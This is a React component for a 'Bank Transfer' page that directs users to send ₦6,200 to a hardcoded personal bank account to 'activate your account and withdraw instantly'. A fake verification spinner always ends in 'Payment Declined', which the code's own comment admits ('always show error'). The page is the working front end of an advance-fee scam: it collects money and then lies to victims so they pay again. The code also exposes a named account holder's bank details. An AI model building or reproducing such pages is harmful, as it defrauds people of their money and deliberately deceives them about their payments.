
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Copy, Wallet, User2, Banknote, AlertCircle } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import { useAuth } from "@/contexts/AuthContext";
import {
  Dialog,
  DialogContent,
} from "@/components/ui/dialog";
import OpayWarningModal from "@/components/OpayWarningModal";

const BankTransferPayment: React.FC = () => {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(true);
  const { user } = useAuth();
  const [timeLeft, setTimeLeft] = useState(1800); // 30 mins in seconds
  const [showProcessingDialog, setShowProcessingDialog] = useState(false);
  const [showErrorDialog, setShowErrorDialog] = useState(false);
  const [showOpayWarning, setShowOpayWarning] = useState(false);
  const [buttonText, setButtonText] = useState("I Have Made Payment");
  const [loadingProgress, setLoadingProgress] = useState(0);
  
  const accountDetails = {
    bankName: "MONIEPOINT MFB",
    accountNumber: "6056570413",
    accountName: "CHUKWUEMEKA AMADI JAMES",
    amount: "₦6,200"
  };
  
  // Load account details with delay
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
      // Show Opay warning after loading is complete
      setShowOpayWarning(true);
    }, 2000);
    
    return () => clearTimeout(timer);
  }, []);

  // Countdown timer
  useEffect(() => {
    if (!isLoading && timeLeft > 0) {
      const countdownTimer = setInterval(() => {
        setTimeLeft(prev => prev - 1);
      }, 1000);
      
      return () => clearInterval(countdownTimer);
    }
  }, [isLoading, timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins} mins ${secs} secs`;
  };

  const handleBack = () => {
    navigate(-1);
  };

  const handleCopyClick = (text: string, label: string) => {
    navigator.clipboard.writeText(text)
      .then(() => {
        toast.success(`${label} copied!`);
      })
      .catch(() => {
        toast.error("Failed to copy");
      });
  };

  const handlePaymentConfirmation = () => {
    // Show processing dialog with 7-second loading
    setShowProcessingDialog(true);
    setButtonText("Pending....");
    setLoadingProgress(0);
    
    // Update progress every 100ms for 7 seconds
    const progressInterval = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return prev + (100 / 70); // 7 seconds = 7000ms, 100ms intervals = 70 steps
      });
    }, 100);
    
    // After 7 seconds, always show error (payment declined)
    setTimeout(() => {
      setShowProcessingDialog(false);
      setShowErrorDialog(true);
      setButtonText("I Have Made Payment");
    }, 7000);
  };

  const handleTryAgain = () => {
    setShowErrorDialog(false);
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Opay Warning Modal - only shows after loading */}
      <OpayWarningModal 
        isOpen={showOpayWarning} 
        onClose={() => setShowOpayWarning(false)} 
      />

      {/* Header - Full width */}
      <div className="flex items-center p-4 border-b">
        <button onClick={handleBack} className="mr-4">
          <ArrowLeft size={20} className="text-green-800" />
        </button>
        <h1 className="text-lg font-medium text-gray-800">Bank Transfer</h1>
      </div>

      <div className="p-4">
        {isLoading ? (
          <div className="flex flex-col items-center justify-center h-64">
            <div className="w-12 h-12 border-3 border-green-800 border-t-transparent rounded-full animate-spin mb-4"></div>
            <p className="text-sm text-gray-600">Loading account details...</p>
          </div>
        ) : (
          <>
            <div className="mb-6">
              <h2 className="text-xl font-bold">Fund Wallet via Bank Transfer</h2>
              <p className="text-gray-500 text-sm mt-2">
                Transfer To This Account Below Within 30mins And Get Activation Code Once Your Payment Got Confirmed
              </p>
            </div>
            
            <div className="bg-gray-50 rounded-lg overflow-hidden">
              <div className="p-4 flex justify-between items-center">
                <div className="flex-1">
                  <div className="flex items-center">
                    <div className="bg-gray-100 p-2 rounded-md mr-4">
                      <Banknote size={24} className="text-green-800" />
                    </div>
                    <div>
                      <p className="text-gray-500 text-sm">Bank Name</p>
                      <p className="font-bold text-green-800">{accountDetails.bankName}</p>
                    </div>
                  </div>
                </div>
                <div className="flex items-center text-blue-600">
                  <span className="bg-green-100 px-3 py-1 rounded-md text-green-600 text-sm">Active</span>
                </div>
              </div>
              
              <div className="border-t p-4 flex justify-between items-center">
                <div className="flex items-center">
                  <div className="bg-gray-200 p-2 rounded-md mr-4 w-10 h-10 flex items-center justify-center">
                    <span className="font-mono text-sm">123</span>
                  </div>
                  <div>
                    <p className="text-gray-500 text-sm">Account Number</p>
                    <p className="font-bold text-gray-800">{accountDetails.accountNumber}</p>
                  </div>
                </div>
                <Button 
                  variant="outline" 
                  size="sm"
                  className="bg-green-800 text-white hover:bg-green-700"
                  onClick={() => handleCopyClick(accountDetails.accountNumber, "Account number")}
                >
                  <Copy size={16} className="mr-2" /> Copy
                </Button>
              </div>
              
              <div className="border-t p-4 flex justify-between items-center">
                <div className="flex items-center">
                  <div className="bg-gray-200 p-2 rounded-md mr-4 w-10 h-10 flex items-center justify-center">
                    <User2 size={20} className="text-gray-600" />
                  </div>
                  <div>
                    <p className="text-gray-500 text-sm">Account Name</p>
                    <p className="font-bold text-gray-800">{accountDetails.accountName}</p>
                  </div>
                </div>
              </div>
              
              <div className="border-t p-4 flex justify-between items-center">
                <div className="flex items-center">
                  <div className="bg-gray-200 p-2 rounded-md mr-4 w-10 h-10 flex items-center justify-center">
                    <Wallet size={20} className="text-blue-600" />
                  </div>
                  <div>
                    <p className="text-gray-500 text-sm">Amount</p>
                    <p className="font-bold text-green-800">{accountDetails.amount}</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-6 bg-gray-100 p-4 rounded-lg">
              <p className="text-gray-700 text-sm">
                Hi, {user?.firstName || "James"}
              </p>
              <p className="text-gray-700 text-sm mt-2">
                Make A One Time Payment In Bank Details Above To Activate Your Account And Withdraw Instantly
              </p>
            </div>
              
            <div className="p-4 text-center text-green-800 text-sm mt-4">
              <p>This one-time account expires in {formatTime(timeLeft)}</p>
            </div>

            <button
              onClick={handlePaymentConfirmation}
              className="w-full bg-green-800 text-white py-3 rounded-lg mt-4 text-base font-medium"
              disabled={showProcessingDialog}
            >
              {buttonText}
            </button>
          </>
        )}
      </div>

      {/* Processing Dialog with 7-second loading - Full page overlay */}
      <Dialog open={showProcessingDialog} onOpenChange={setShowProcessingDialog}>
        <DialogContent className="sm:max-w-md p-0 gap-0">
          <div className="p-8">
            <h2 className="text-2xl font-bold text-center mb-8">Payment Processing</h2>
            <div className="flex flex-col items-center justify-center">
              <div className="w-24 h-24 rounded-full border-4 border-gray-200 mb-6 relative">
                <div 
                  className="absolute inset-0 rounded-full border-4 border-green-800 border-t-transparent animate-spin"
                  style={{ 
                    transform: `rotate(${(loadingProgress / 100) * 360}deg)`
                  }}
                ></div>
                <div className="absolute inset-2 bg-green-800 rounded-full flex items-center justify-center">
                  <span className="text-white text-sm font-bold">{Math.round(loadingProgress)}%</span>
                </div>
              </div>
              <p className="text-gray-500 text-lg">Verifying Payment...</p>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Payment Error Dialog */}
      <Dialog open={showErrorDialog} onOpenChange={setShowErrorDialog}>
        <DialogContent className="sm:max-w-md p-0 gap-0">
          <div className="p-8">
            <div className="flex flex-col items-center mb-6">
              <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mb-6">
                <AlertCircle size={40} className="text-red-600" />
              </div>
              <h2 className="text-2xl font-bold text-center text-gray-800">Payment Declined</h2>
              <p className="text-center text-gray-600 mt-3">Your payment could not be processed. Please try again later.</p>
            </div>
            
            <button
              onClick={handleTryAgain}
              className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
            >
              TRY AGAIN
            </button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default BankTransferPayment;
